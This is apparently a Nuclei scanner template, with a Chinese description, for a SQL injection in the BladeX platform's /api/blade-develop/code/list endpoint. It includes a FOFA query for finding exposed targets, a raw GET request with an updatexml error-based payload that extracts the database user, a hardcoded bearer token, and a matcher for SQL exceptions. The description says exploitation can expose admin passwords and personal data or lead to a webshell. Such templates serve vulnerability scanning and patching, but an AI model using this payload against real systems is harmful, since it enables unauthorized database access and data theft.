id: BladeX-code_list-sql

info:
  name: BladeX企业级开发平台 code/list SQL 注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="https://bladex.vip"
    BladeX企业级开发平台 code/list 存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486228&idx=1&sn=3ab4633544c3ff63cdca02ce7207d020&chksm=c267be27f510373131238620eeb0b6caa7c91a5c50c916724a7193e69552e418314c5a6806cf&token=1742030890&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /api/blade-develop/code/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    matchers:
      - type: word
        part: body
        words:
          - 'java.sql.SQLException'






